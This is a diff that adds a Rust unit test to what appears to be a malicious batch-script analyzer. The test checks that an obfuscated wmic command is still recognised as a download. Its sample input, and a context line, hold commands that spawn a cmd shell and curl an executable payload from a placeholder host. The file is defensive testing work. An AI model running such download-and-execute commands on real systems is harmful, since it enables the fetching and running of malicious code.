@@ -27079,6 +27079,25 @@ C:\Users\Public\wm.tmp process call create "cmd /c curl -o out.exe https://copie
     }
 
     #[test]
+    fn wmic_process_call_create_preserves_escaped_delayed_comspec_child() {
+        let script = br#"setlocal EnableDelayedExpansion
+wmic process call create "%COMSPEC% /V:ON /c set U=https://wmic-escaped.example/payload.exe&&curl -o payload.exe ^!U^!""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://wmic-escaped.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "escaped wmic COMSPEC child did not preserve delayed expansion: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn wmic_process_call_create_tolerates_spacing_and_case() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
